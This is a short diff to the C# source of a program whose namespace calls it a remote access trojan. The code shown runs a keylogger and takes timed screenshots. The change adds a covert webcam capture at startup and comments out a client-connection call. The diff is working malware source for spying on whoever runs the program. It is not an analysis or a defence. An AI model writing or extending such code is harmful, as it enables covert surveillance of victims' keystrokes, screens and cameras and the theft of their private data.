@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
 
@@ -21,8 +22,13 @@ namespace remote_access_trojan
 
             SetTimer();
             Keylogger.Run();
+
+            Webcam webcam = new Webcam();
+            Thread.Sleep(1000);
+            webcam.TakePicture(1);
+
            // Client.ZipFiles();
-            Client.newClient();
+          //  Client.newClient();
 
             // Do not move - this needs to be the last line
             Application.Run();
@@ -49,6 +55,7 @@ namespace remote_access_trojan
             }
 
             Screenshot.takeScreenshot(timerCount);
+            //Webcam.TakePicture(timerCount);
             Console.WriteLine("Timer Tick: " + timerCount);
 
             timerCount++;
